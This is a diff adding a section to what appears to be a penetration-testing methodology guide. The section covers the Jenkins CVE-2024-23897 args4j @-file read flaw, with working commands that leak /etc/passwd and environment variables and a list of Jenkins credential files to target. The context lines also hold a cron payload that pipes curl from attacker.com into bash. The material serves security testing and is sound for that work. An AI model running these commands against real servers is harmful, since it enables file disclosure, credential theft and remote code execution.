@@ -167,6 +167,45 @@ filename="../../../../etc/cron.d/backdoor"
 * * * * * root curl http://attacker.com/shell | bash
 ```
 
+### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)
+
+Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Unauthenticated when "anonymous read access" is on (Jenkins default for fresh installs).
+
+**Detection:**
+- Target exposes `/cli` and `/jnlpJars/jenkins-cli.jar` (Jenkins family)
+- Or: any Java app whose CLI source uses args4j without `expandAtFiles=false`
+
+**Test (Jenkins):**
+```bash
+# Get the legit CLI jar from the target
+curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar
+
+# First line of file leaks via 'help' error
+java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd
+# → ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash
+
+# Full file leaks via 'connect-node' (every line returned as a "no such agent" error)
+java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd
+# → All passwd lines echoed back
+
+# Recon: env vars + JENKINS_HOME path
+java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/environ
+```
+
+**Crown-jewel files after JENKINS_HOME confirmed:**
+- `/var/jenkins_home/secret.key` — master encryption key for stored credentials
+- `/var/jenkins_home/secrets/master.key` — derives the encryption key
+- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)
+- `/var/jenkins_home/users/*/config.xml` — per-user API tokens (often unencrypted)
+- `/var/jenkins_home/jobs/*/config.xml` — pipeline configs that may inline AWS keys, SSH keys, registry tokens
+
+**Pattern generalizes beyond Jenkins.** Any Java service that:
+1. Embeds args4j (most enterprise Java CLIs since 2010s)
+2. Exposes the CLI handler over HTTP (Jenkins, Hudson forks, custom internal tools)
+3. Returns argument-parsing errors verbatim to the client
+
+→ same arbitrary-read primitive applies. Validation via `triage-validation` Reproducibility Gate: confirm the leak on at least 2 distinct commands (e.g., `help` and `connect-node`) and verify the file content actually appears in the response, not just a generic 500.
+
 ### Grep Patterns for Source Review
 ```bash
 # Command injection sinks
